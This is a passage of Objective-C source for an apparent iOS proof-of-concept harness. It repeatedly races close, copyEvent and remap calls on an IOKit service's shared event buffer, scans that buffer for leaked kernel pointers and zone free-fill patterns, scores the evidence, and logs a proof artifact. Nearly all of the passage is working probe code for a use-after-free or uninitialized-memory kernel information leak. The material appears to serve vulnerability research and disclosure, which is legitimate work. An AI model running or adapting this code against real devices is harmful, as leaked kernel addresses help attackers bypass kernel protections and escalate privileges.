    [self appendLog:[NSString stringWithFormat:@"Entropy delta: %+.4f", entropyDelta]];
    [self appendLog:[NSString stringWithFormat:
                     @"Cross-client events: %d/%d checks",
                     self.proofCrossClientEvents, self.proofCrossClientChecks]];
    [self appendLog:[NSString stringWithFormat:
                     @"Termination overlap: %d probes, %d opener cycles",
                     self.proofTerminationProbes, self.proofTerminationOpenCycles]];

    self.proofHashChanged = hashChanged;
    self.proofKernelPointerPatterns = (kernPtrCount > 0);
    self.proofEntropyDelta = entropyDelta;

    NSInteger proofScore = 0;
    NSString *proofReason = @"No actionable cross-client evidence.";
    if (self.proofCrossClientSignal) {
        proofScore += 50;
    }
    if (self.proofKernelPointerLeak) {
        proofScore += 20;
    }
    if (kernPtrCount > 0) {
        proofScore += 30;
    }
    if (finalPrimaryLeakCount > 0) {
        // Detected during live race scanning - very strong signal
        proofScore += 40;
    }
    if (self.proofReadAfterCloseLeaks > 0) {
        proofScore += 35;  // Read-after-close exposed kernel data
    }
    if (self.proofUninitLeaks > 0) {
        proofScore += 30;  // Uninitialized buffer contained kernel ptrs
    }
    if (self.proofRemapAfterFreeLeaks > 0) {
        proofScore += 35;  // Remap-after-free exposed kernel data
    }
    if (self.proofZoneFreePatternHits > 0) {
        proofScore += 25;  // Zone free-patterns suggest stale references observable from userspace
    }
    if (self.proofTermRaceActive) {
        proofScore += 25;
    }
    if (self.proofHashChanged) {
        proofScore += 15;
    }
    if (fabs(entropyDelta) > 0.3) {
        proofScore += 15;
    }
    if (proofScore > 100) proofScore = 100;

    if (proofScore >= 70) {
        proofReason = @"High confidence lifecycle boundary bug signal (cross-client data misdirection + overlapping termination activity).";
    } else if (proofScore >= 45) {
        proofReason = @"Moderate confidence: some lifecycle boundary signals present; reproduce with multiple iterations.";
    } else if (proofScore >= 30) {
        proofReason = @"Low-to-moderate confidence: isolated signal(s), add run loops for stronger statistical confidence.";
    }

    [self appendLog:[NSString stringWithFormat:@"PoC Confidence Score: %ld/100", (long)proofScore]];
    [self appendLog:[NSString stringWithFormat:@"PoC Verdict: %@", proofReason]];

    if (self.proofCrossClientSignal && self.proofFirstCrossClientConn >= 0) {
        NSString *proofHex = self.proofFirstCrossClientHex ?: @"<none>";
        [self appendLog:[NSString stringWithFormat:
            @"PoC Witness: first misdirected aux buffer conn=%d eventSize=%u hex=%@",
            self.proofFirstCrossClientConn, self.proofFirstCrossClientEventSize, proofHex]];
    }

    if (self.proofKernelPointerLeak) {
        [self appendLog:[NSString stringWithFormat:
            @"*** PoC Pointer Signal: conn=%d offset=0x%x value=0x%016llx (%@) ***",
            self.proofKernelPointerSourceConn,
            self.proofKernelPointerOffset,
            self.proofKernelPointerValue,
            self.proofKernelPointerHex ?: @"<none>"]];
    }

    if (finalPrimaryLeakCount > 0) {
        [self appendLog:[NSString stringWithFormat:
            @"*** FINDING: Detected %d kernel pointer exposures during live race scanning ***",
            finalPrimaryLeakCount]];
        [self appendLog:@"  This indicates kernel addresses are observable in userspace-mapped buffers"];
        [self appendLog:@"  during lifecycle race conditions — a memory boundary inconsistency requiring hardening."];
    }

    // Report advanced probe results
    if (self.proofReadAfterCloseLeaks > 0) {
        [self appendLog:[NSString stringWithFormat:
            @"*** READ-AFTER-CLOSE: %d kernel pointer patterns found during close teardown window ***",
            self.proofReadAfterCloseLeaks]];
    }
    if (self.proofUninitLeaks > 0) {
        [self appendLog:[NSString stringWithFormat:
            @"*** UNINIT BUFFER: %d kernel pointer patterns found in fresh buffers ***",
            self.proofUninitLeaks]];
    }
    if (self.proofRemapAfterFreeLeaks > 0) {
        [self appendLog:[NSString stringWithFormat:
            @"*** POST-CLOSE REMAP: %d kernel pointer patterns found via stale buffer remap ***",
            self.proofRemapAfterFreeLeaks]];
    }
    if (self.proofZoneFreePatternHits > 0) {
        [self appendLog:[NSString stringWithFormat:
            @"*** ZONE FREE-PATTERN: %d stale-reference signatures (0xDEADBEEF etc.) visible from userspace ***",
            self.proofZoneFreePatternHits]];
    }

    if (kernPtrCount > 0) {
        [self appendLog:[NSString stringWithFormat:
            @"CONCLUSION: %u kernel pointer patterns observed in mapped buffer post-stress.", kernPtrCount]];
        [self appendLog:@"  Combined with cross-client/termination signals, this strongly indicates"];
        [self appendLog:@"  observable kernel memory boundary inconsistency via lifecycle race conditions."];
    } else if (fabs(entropyDelta) > 0.3) {
        [self appendLog:@"CONCLUSION: Significant entropy drift detected post-stress; treat as possible allocation/state reuse."
                     "\n  Pair with cross-client / termination-race signals above for confidence."];
    } else if (hashChanged) {
        [self appendLog:@"CONCLUSION: Fingerprint changed post-stress without pointer-like values."
                     "\n  This is consistent with state drift and should be interpreted with other lifecycle signals."];
    } else {
        // Hash/entropy changes alone are not a strong signal: many event buffers legitimately vary
        // across time and across calls as new events are produced.
        [self appendLog:@"CONCLUSION: No strong anomalies detected in this run (no pointer-like patterns or major drift)."];
    }

    NSDateFormatter *isoFormatter = [[NSDateFormatter alloc] init];
    isoFormatter.locale = [NSLocale localeWithLocaleIdentifier:@"en_US_POSIX"];
    isoFormatter.timeZone = [NSTimeZone timeZoneWithAbbreviation:@"UTC"];
    isoFormatter.dateFormat = @"yyyy-MM-dd'T'HH:mm:ss.SSS'Z'";
    NSString *artifactTimestamp = [isoFormatter stringFromDate:[NSDate date]];

    NSDictionary *artifact = @{
        @"test": @"lifecycle-boundary-v2",
        @"timestampUtc": artifactTimestamp ?: @"<invalid>",
        @"bundleId": NSBundle.mainBundle.bundleIdentifier ?: @"<nil>",
        @"deviceModel": UIDevice.currentDevice.model ?: @"<nil>",
        @"osVersion": UIDevice.currentDevice.systemVersion ?: @"<nil>",
        @"result": @{
                @"proofScore": @(proofScore),
                @"reason": proofReason ?: @"<nil>",
                @"conclusion": self.proofKernelPointerLeak ? @"kernel_pointer_exposure_detected"
                                                        : (proofScore >= 70 ? @"high_confidence"
                                                                            : @"needs_more_evidence"),
                @"hashChanged": @(hashChanged),
                @"kernelPtrPatterns": @(kernPtrCount),
                @"entropyDelta": @(entropyDelta),
                @"preHash": [NSString stringWithFormat:@"0x%016llx", preHash],
                @"postHash": [NSString stringWithFormat:@"0x%016llx", postHash]
        },
        @"crossClient": @{
                @"events": @(self.proofCrossClientEvents),
                @"checks": @(self.proofCrossClientChecks),
                @"firstConn": @(self.proofFirstCrossClientConn),
                @"firstEventSize": @(self.proofFirstCrossClientEventSize),
                @"firstHex": self.proofFirstCrossClientHex ?: @"<none>"
        },
        @"terminationRace": @{
                @"probes": @(self.proofTerminationProbes),
                @"openerCycles": @(self.proofTerminationOpenCycles),
                @"active": @(self.proofTermRaceActive)
        },
        @"liveRaceScanning": @{
                @"totalScans": @(finalPrimaryScanCount),
                @"leaksDetected": @(finalPrimaryLeakCount),
                @"leakRate": finalPrimaryScanCount > 0 ? @((double)finalPrimaryLeakCount / (double)finalPrimaryScanCount) : @(0.0)
        },
        @"leakCandidate": self.proofKernelPointerLeak ? @{
                @"value": [NSString stringWithFormat:@"0x%016llx", self.proofKernelPointerValue],
                @"offset": @(self.proofKernelPointerOffset),
                @"sourceConn": @(self.proofKernelPointerSourceConn),
                @"raw": self.proofKernelPointerHex ?: @"<none>"
        } : @{},
        @"advancedProbes": @{
                @"readAfterCloseLeaks": @(self.proofReadAfterCloseLeaks),
                @"uninitBufferLeaks": @(self.proofUninitLeaks),
                @"remapAfterFreeLeaks": @(self.proofRemapAfterFreeLeaks),
                @"zoneFreePatternHits": @(self.proofZoneFreePatternHits)
        }
    };

    [self appendPocArtifactEntry:artifact];
    if (self.proofArtifactPath) {
        [self appendLog:[NSString stringWithFormat:@"Proof artifact path: %@", self.proofArtifactPath]];
    }

    [self appendLog:@"====== Sub-phase D Complete ======"];
}

#pragma mark - Sub-phase E: Zone Free-Pattern / Stale Reference Detection

- (BOOL)isZoneFreePattern:(uint64_t)value {
    if (value == 0) return NO;
    uint32_t lo32 = (uint32_t)(value & 0xFFFFFFFF);
    uint32_t hi32 = (uint32_t)(value >> 32);

    // XNU kalloc zone free-fill patterns
    if (lo32 == 0xDEADBEEF || hi32 == 0xDEADBEEF) return YES;
    if (lo32 == 0xDEADDEAD || hi32 == 0xDEADDEAD) return YES;
    if (lo32 == 0xBAADF00D || hi32 == 0xBAADF00D) return YES;
    if (lo32 == 0xABABABAB || hi32 == 0xABABABAB) return YES;

    // XNU zone_poisoned_cookie / kasan free-fill patterns
    if (value == 0xDEADC0DEDEADC0DEULL) return YES;
    if (value == 0xFEEDFACEFEEDFACEULL) return YES;
    if (value == 0xDEADBEEFDEADBEEFULL) return YES;
    if (value == 0xBBBADF00BBBADF00ULL) return YES;

    // MTE tag patterns (arm64e): tagged pointers with high nibble tags
    // After free, MTE-tagged pointers have invalid tags
    if ((value >> 56) != 0 && (value >> 56) != 0xFF) {
        uint64_t untagged = value & 0x00FFFFFFFFFFFFFFULL;
        if (untagged >= 0x00FFFFFE00000000ULL && untagged <= 0x00FFFFFFFFFFFFFFULL) {
            return YES;  // MTE-tagged kernel pointer with wrong tag = stale reference indicator
        }
    }

    // Repeated byte patterns (zone fill)
    uint8_t b0 = (uint8_t)(value & 0xFF);
    BOOL allSame = YES;
    for (int i = 1; i < 8; i++) {
        if (((uint8_t)(value >> (i * 8)) & 0xFF) != b0) {
            allSame = NO;
            break;
        }
    }
    if (allSame && b0 != 0x00 && b0 != 0xFF) return YES;

    return NO;
}

- (int)scanForZoneFreePatterns:(const uint8_t *)base length:(size_t)length {
    int count = 0;
    for (size_t off = 0; off + 8 <= length; off += 4) {
        uint64_t val = 0;
        memcpy(&val, base + off, sizeof(val));
        if ([self isZoneFreePattern:val]) {
            count++;
            if (count <= 5) {
                [self appendLog:[NSString stringWithFormat:
                    @"    ZONE FREE-PATTERN at +0x%zx: 0x%016llx", off, val]];
            }
        }
    }
    return count;
}

#pragma mark - Sub-phase E1: Read-After-Close Race

- (void)runReadAfterCloseProbe:(io_connect_t *)connections
                         count:(int)connCount
                    mappedAddr:(mach_vm_address_t)mappedAddr
                    mappedSize:(mach_vm_size_t)mappedSize
                   raceService:(io_service_t)raceService {
    [self appendLog:@"\n====== Sub-phase E1: Read-After-Close Memory Boundary Probe ======"];
    [self appendLog:@"  Strategy: Close conn → immediately scan mapped buffer for residual kernel-space patterns"];

    const uint8_t *base = (const uint8_t *)(uintptr_t)mappedAddr;
    size_t scanSize = MIN((size_t)mappedSize, (size_t)kMappedProbeMaxBytes);

    // Snapshot before we start
    uint8_t *preCloseSnap = (uint8_t *)malloc(scanSize);
    if (!preCloseSnap) {
        [self appendLog:@"  SKIP: allocation failed"];
        return;
    }
    memcpy(preCloseSnap, base, scanSize);

    int totalLeaks = 0;
    int totalFreePatterns = 0;
    int totalNewBytes = 0;
    static const int kReadAfterCloseIterations = 500;

    for (int iter = 0; iter < kReadAfterCloseIterations; iter++) {
        // Close conn[0] — this triggers closeForClient which tears down the ClientObject
        uint64_t closeScalar = 0;
        kern_return_t ckr = sIOConnectCallMethod(connections[0], kSelectorClose,
                             &closeScalar, 1, NULL, 0, NULL, NULL, NULL, NULL);

        // IMMEDIATELY scan the mapped buffer — the kernel may not have finished cleanup
        // Look for kernel pointers that briefly appear during teardown
        NSArray<NSDictionary *> *leaks = [self scanForKernelPointers:base
                                                              length:scanSize
                                                          maxResults:20
                                                           connIndex:0];

        // Also scan for zone free-patterns (stale reference indicators)
        int freePatternHits = [self scanForZoneFreePatterns:base length:scanSize];

        // Check for byte-level changes from our snapshot
        int changedBytes = 0;
        for (size_t i = 0; i < scanSize; i++) {
            if (base[i] != preCloseSnap[i]) changedBytes++;
        }

        if (leaks.count > 0 || freePatternHits > 0 || (changedBytes > 0 && iter < 5)) {
            [self appendLog:[NSString stringWithFormat:
                @"  [iter %d] close=0x%x kernPtrs=%lu freePatterns=%d changed=%d bytes",
                iter, ckr, (unsigned long)leaks.count, freePatternHits, changedBytes]];

            for (NSDictionary *leak in leaks) {
                [self appendLog:[NSString stringWithFormat:
                    @"    *** KERNEL PTR PATTERN: offset=0x%@ value=%@ ***",
                    leak[@"offset"], leak[@"value"]]];
            }
        }

        totalLeaks += (int)leaks.count;
        totalFreePatterns += freePatternHits;
        totalNewBytes += (changedBytes > 0) ? 1 : 0;

        // Update snapshot
        memcpy(preCloseSnap, base, scanSize);

        // Also try reading via copyEvent struct output right after close
        uint64_t scalarsIn[2] = { 0, 1 };
        uint8_t structOut[512];
        size_t structOutSize = sizeof(structOut);
        kern_return_t copyKr = sIOConnectCallMethod(connections[0], kSelectorCopyEvent,
            scalarsIn, 2, NULL, 0, NULL, NULL, structOut, &structOutSize);

        // Scan the struct output for kernel pointers
        if (copyKr == KERN_SUCCESS && structOutSize > 0) {
            NSArray<NSDictionary *> *structLeaks = [self scanForKernelPointers:structOut
                                                                        length:structOutSize
                                                                    maxResults:10
                                                                     connIndex:-1];
            if (structLeaks.count > 0) {
                [self appendLog:[NSString stringWithFormat:
                    @"    *** STRUCT OUTPUT FINDING (post-close): %lu kernel pointer patterns ***",
                    (unsigned long)structLeaks.count]];
                for (NSDictionary *leak in structLeaks) {
                    [self appendLog:[NSString stringWithFormat:
                        @"      offset=0x%@ value=%@", leak[@"offset"], leak[@"value"]]];
                }
                totalLeaks += (int)structLeaks.count;
            }
        }

        // Re-open so we can close again next iteration
        uint64_t openScalar = 0;
        const char *xml = kOpenPropertiesXML;
        sIOConnectCallMethod(connections[0], kSelectorOpen,
                             &openScalar, 1, xml, strlen(xml) + 1,
                             NULL, NULL, NULL, NULL);
    }

    free(preCloseSnap);

    self.proofReadAfterCloseLeaks = totalLeaks;
    self.proofZoneFreePatternHits += totalFreePatterns;

    [self appendLog:[NSString stringWithFormat:
        @"  Read-after-close summary: %d iterations, %d kernel ptrs, %d free-patterns, %d buffer-change events",
        kReadAfterCloseIterations, totalLeaks, totalFreePatterns, totalNewBytes]];

    if (totalLeaks > 0) {
        [self appendLog:@"  *** FINDING: Kernel pointer patterns found during close teardown window ***"];
    }
    if (totalFreePatterns > 0) {
        [self appendLog:@"  *** FINDING: Zone free-patterns detected in mapped buffer (stale reference indicator) ***"];
    }

    [self appendLog:@"====== Sub-phase E1 Complete ======"];
}

#pragma mark - Sub-phase E2: Uninitialized Buffer Probe

- (void)runUninitBufferProbe:(io_service_t)raceService {
    [self appendLog:@"\n====== Sub-phase E2: Uninitialized Buffer Probe ======"];
    [self appendLog:@"  Strategy: Open fresh connection → map buffer → verify zeroed state before any copyEvent"];

    if (raceService == MACH_PORT_NULL) {
        [self appendLog:@"  SKIP: no service port"];
        return;
    }

    int totalLeaks = 0;
    int totalFreePatterns = 0;
    int totalNonZero = 0;
    static const int kUninitProbeIterations = 200;

    for (int iter = 0; iter < kUninitProbeIterations; iter++) {
        // Open a fresh connection
        io_connect_t freshConn = MACH_PORT_NULL;
        kern_return_t okr = sIOServiceOpen(raceService, mach_task_self_, 2, &freshConn);
        if (okr != KERN_SUCCESS || freshConn == MACH_PORT_NULL) continue;

        // Gate it (open via selector 0)
        uint64_t openScalar = 0;
        const char *xml = kOpenPropertiesXML;
        kern_return_t gkr = sIOConnectCallMethod(freshConn, kSelectorOpen,
                             &openScalar, 1, xml, strlen(xml) + 1,
                             NULL, NULL, NULL, NULL);
        if (gkr != KERN_SUCCESS) {
            sIOServiceClose(freshConn);
            mach_port_deallocate(mach_task_self(), freshConn);
            continue;
        }

        // Map the shared buffer — BEFORE any copyEvent call
        mach_vm_address_t mapAddr = 0;
        mach_vm_size_t mapSize = 0;
        kern_return_t mkr = KERN_FAILURE;
        if (sIOConnectMapMemory64) {
            mkr = sIOConnectMapMemory64(freshConn, kMemoryTypeEventBuffer,
                                         mach_task_self_, &mapAddr, &mapSize, 1);
        }

        if (mkr == KERN_SUCCESS && mapAddr != 0 && mapSize > 0) {
            const uint8_t *freshBase = (const uint8_t *)(uintptr_t)mapAddr;
            size_t freshSize = MIN((size_t)mapSize, (size_t)kMappedProbeMaxBytes);

            // Check if the buffer is non-zero BEFORE any event read
            BOOL isAllZero = [self isZeroFilled:freshBase length:freshSize];

            if (!isAllZero) {
                totalNonZero++;

                // Scan for kernel pointers in the uninitialized buffer
                NSArray<NSDictionary *> *leaks = [self scanForKernelPointers:freshBase
                                                                      length:freshSize
                                                                  maxResults:20
                                                                   connIndex:-2];

                int freePatternHits = [self scanForZoneFreePatterns:freshBase length:freshSize];

                if (leaks.count > 0 || freePatternHits > 0 || totalNonZero <= 3) {
                    [self appendLog:[NSString stringWithFormat:
                        @"  [iter %d] NON-ZERO pre-event buffer! kernPtrs=%lu freePatterns=%d size=%zu",
                        iter, (unsigned long)leaks.count, freePatternHits, freshSize]];

                    // Show first 64 bytes of the uninit buffer
                    [self appendLog:[NSString stringWithFormat:@"    hex: %@",
                        [self hexPreview:freshBase length:MIN(freshSize, (size_t)64)]]];

                    for (NSDictionary *leak in leaks) {
                        [self appendLog:[NSString stringWithFormat:
                            @"    *** UNINIT KERNEL PTR PATTERN: offset=0x%@ value=%@ ***",
                            leak[@"offset"], leak[@"value"]]];
                    }
                }

                totalLeaks += (int)leaks.count;
                totalFreePatterns += freePatternHits;
            }

            // Unmap
            if (sIOConnectUnmapMemory64) {
                sIOConnectUnmapMemory64(freshConn, kMemoryTypeEventBuffer, mach_task_self_, mapAddr);
            } else {
                vm_deallocate(mach_task_self(), (vm_address_t)mapAddr, (vm_size_t)mapSize);
            }
        }

        // Close and release
        uint64_t closeScalar = 0;
        sIOConnectCallMethod(freshConn, kSelectorClose, &closeScalar, 1, NULL, 0, NULL, NULL, NULL, NULL);
        sIOServiceClose(freshConn);
        mach_port_deallocate(mach_task_self(), freshConn);
    }

    self.proofUninitLeaks = totalLeaks;
    self.proofZoneFreePatternHits += totalFreePatterns;

    [self appendLog:[NSString stringWithFormat:
        @"  Uninit buffer summary: %d iterations, %d non-zero buffers, %d kernel ptrs, %d free-patterns",
        kUninitProbeIterations, totalNonZero, totalLeaks, totalFreePatterns]];

    if (totalLeaks > 0) {
        [self appendLog:@"  *** FINDING: Kernel pointer patterns found in uninitialized mapped buffers ***"];
    }
    if (totalNonZero > 0 && totalLeaks == 0) {
        [self appendLog:@"  INFO: Non-zero residual data found but no kernel address patterns."];
        [self appendLog:@"    May contain heap metadata or stale event data from prior allocation."];
    }

    [self appendLog:@"====== Sub-phase E2 Complete ======"];
}

#pragma mark - Sub-phase E3: Post-Close Remap Boundary Probe

- (void)runRemapAfterFreeProbe:(io_service_t)raceService {
    [self appendLog:@"\n====== Sub-phase E3: Post-Close Remap Boundary Probe ======"];
    [self appendLog:@"  Strategy: Open→map→close→remap on stale conn to test boundary enforcement on freed buffer backing"];

    if (raceService == MACH_PORT_NULL) {
        [self appendLog:@"  SKIP: no service port"];
        return;
    }

    int totalLeaks = 0;
    int totalFreePatterns = 0;
    int totalRemapSuccess = 0;
    int totalStaleReads = 0;
    static const int kRemapIterations = 200;

    for (int iter = 0; iter < kRemapIterations; iter++) {
        // Open a fresh connection and gate it
        io_connect_t conn = MACH_PORT_NULL;
        kern_return_t okr = sIOServiceOpen(raceService, mach_task_self_, 2, &conn);
        if (okr != KERN_SUCCESS || conn == MACH_PORT_NULL) continue;

        uint64_t openScalar = 0;
        const char *xml = kOpenPropertiesXML;
        kern_return_t gkr = sIOConnectCallMethod(conn, kSelectorOpen,
                             &openScalar, 1, xml, strlen(xml) + 1,
                             NULL, NULL, NULL, NULL);
        if (gkr != KERN_SUCCESS) {
            sIOServiceClose(conn);
            mach_port_deallocate(mach_task_self(), conn);
            continue;
        }

        // Map the buffer (populate it)
        mach_vm_address_t mapAddr = 0;
        mach_vm_size_t mapSize = 0;
        kern_return_t mkr = KERN_FAILURE;
        if (sIOConnectMapMemory64) {
            mkr = sIOConnectMapMemory64(conn, kMemoryTypeEventBuffer,
                                         mach_task_self_, &mapAddr, &mapSize, 1);
        }

        if (mkr != KERN_SUCCESS || mapAddr == 0 || mapSize == 0) {
            uint64_t closeScalar = 0;
            sIOConnectCallMethod(conn, kSelectorClose, &closeScalar, 1, NULL, 0, NULL, NULL, NULL, NULL);
            sIOServiceClose(conn);
            mach_port_deallocate(mach_task_self(), conn);
            continue;
        }

        // Do a copyEvent to populate the buffer with known-good data
        uint64_t scalarsIn[2] = { 0, 1 };
        uint8_t structOut[64];
        size_t structOutSize = sizeof(structOut);
        sIOConnectCallMethod(conn, kSelectorCopyEvent,
            scalarsIn, 2, NULL, 0, NULL, NULL, structOut, &structOutSize);

        // Snapshot the buffer content before close
        size_t scanSize = MIN((size_t)mapSize, (size_t)kMappedProbeMaxBytes);
        uint8_t *preCloseSnap = (uint8_t *)malloc(scanSize);
        if (preCloseSnap) {
            memcpy(preCloseSnap, (const void *)(uintptr_t)mapAddr, scanSize);
        }

        // CLOSE the connection's internal state (sel 1) — releases ClientObject
        uint64_t closeScalar = 0;
        sIOConnectCallMethod(conn, kSelectorClose, &closeScalar, 1, NULL, 0, NULL, NULL, NULL, NULL);

        // The mapped region might still be valid in our address space even though
        // the kernel-side object was freed. Read it immediately.
        const uint8_t *staleBase = (const uint8_t *)(uintptr_t)mapAddr;

        // Check if the buffer changed after close (indicates kernel wrote during teardown)
        BOOL changed = NO;
        if (preCloseSnap) {
            changed = (memcmp(staleBase, preCloseSnap, scanSize) != 0);
        }

        if (changed) {
            totalStaleReads++;

            NSArray<NSDictionary *> *leaks = [self scanForKernelPointers:staleBase
                                                                  length:scanSize
                                                              maxResults:20
                                                               connIndex:-3];

            int freePatternHits = [self scanForZoneFreePatterns:staleBase length:scanSize];

            if (leaks.count > 0 || freePatternHits > 0 || totalStaleReads <= 3) {
                [self appendLog:[NSString stringWithFormat:
                    @"  [iter %d] BUFFER CHANGED AFTER CLOSE! kernPtrs=%lu freePatterns=%d",
                    iter, (unsigned long)leaks.count, freePatternHits]];

                // Show what changed
                if (preCloseSnap) {
                    int diffCount = 0;
                    for (size_t i = 0; i < MIN(scanSize, (size_t)64); i++) {
                        if (staleBase[i] != preCloseSnap[i]) diffCount++;
                    }
                    [self appendLog:[NSString stringWithFormat:@"    %d bytes differ in first 64",
                                     diffCount]];
                    [self appendLog:[NSString stringWithFormat:@"    post-close hex: %@",
                        [self hexPreview:staleBase length:MIN(scanSize, (size_t)64)]]];
                }

                for (NSDictionary *leak in leaks) {
                    [self appendLog:[NSString stringWithFormat:
                        @"    *** POST-CLOSE REMAP KERNEL PTR PATTERN: offset=0x%@ value=%@ ***",
                        leak[@"offset"], leak[@"value"]]];
                }
            }

            totalLeaks += (int)leaks.count;
            totalFreePatterns += freePatternHits;
        }

        // Try to remap on the same (now closed-internally) connection
        mach_vm_address_t remapAddr = 0;
        mach_vm_size_t remapSize = 0;
        if (sIOConnectMapMemory64) {
            kern_return_t remapKr = sIOConnectMapMemory64(conn, kMemoryTypeEventBuffer,
                                                           mach_task_self_, &remapAddr, &remapSize, 1);
            if (remapKr == KERN_SUCCESS && remapAddr != 0 && remapSize > 0) {
                totalRemapSuccess++;

                const uint8_t *remapBase = (const uint8_t *)(uintptr_t)remapAddr;
                size_t remapScan = MIN((size_t)remapSize, (size_t)kMappedProbeMaxBytes);

                NSArray<NSDictionary *> *remapLeaks = [self scanForKernelPointers:remapBase
                                                                           length:remapScan
                                                                       maxResults:20
                                                                        connIndex:-4];

                int remapFreePatterns = [self scanForZoneFreePatterns:remapBase length:remapScan];

                if (remapLeaks.count > 0 || remapFreePatterns > 0 || totalRemapSuccess <= 3) {
                    [self appendLog:[NSString stringWithFormat:
                        @"  [iter %d] REMAP SUCCEEDED on closed conn! kernPtrs=%lu freePatterns=%d",
                        iter, (unsigned long)remapLeaks.count, remapFreePatterns]];
                    [self appendLog:[NSString stringWithFormat:@"    remap hex: %@",
                        [self hexPreview:remapBase length:MIN(remapScan, (size_t)64)]]];
                }

                totalLeaks += (int)remapLeaks.count;
                totalFreePatterns += remapFreePatterns;

                // Clean up remap
                if (sIOConnectUnmapMemory64) {
                    sIOConnectUnmapMemory64(conn, kMemoryTypeEventBuffer, mach_task_self_, remapAddr);
                } else {
                    vm_deallocate(mach_task_self(), (vm_address_t)remapAddr, (vm_size_t)remapSize);
                }
            }
        }

        if (preCloseSnap) free(preCloseSnap);

        // Clean up original mapping and connection
        if (sIOConnectUnmapMemory64) {
            sIOConnectUnmapMemory64(conn, kMemoryTypeEventBuffer, mach_task_self_, mapAddr);
        } else {
            vm_deallocate(mach_task_self(), (vm_address_t)mapAddr, (vm_size_t)mapSize);
        }
        sIOServiceClose(conn);
        mach_port_deallocate(mach_task_self(), conn);
    }

    self.proofRemapAfterFreeLeaks = totalLeaks;
    self.proofZoneFreePatternHits += totalFreePatterns;

    [self appendLog:[NSString stringWithFormat:
        @"  Post-close remap summary: %d iterations, %d stale reads, %d remaps ok, %d kernel ptrs, %d free-patterns",
        kRemapIterations, totalStaleReads, totalRemapSuccess, totalLeaks, totalFreePatterns]];

    if (totalLeaks > 0) {
        [self appendLog:@"  *** FINDING: Kernel pointer patterns found via post-close buffer remap ***"];
    }
    if (totalFreePatterns > 0) {
        [self appendLog:@"  *** FINDING: Zone free-patterns visible via stale/remapped buffer (stale reference indicator) ***"];
    }
    if (totalStaleReads > 0 && totalLeaks == 0 && totalFreePatterns == 0) {
        [self appendLog:@"  INFO: Buffer contents changed during close but no kernel addresses found."];
        [self appendLog:@"    Indicates kernel modifies the shared mapping during teardown."];
    }

    [self appendLog:@"====== Sub-phase E3 Complete ======"];
}

@end
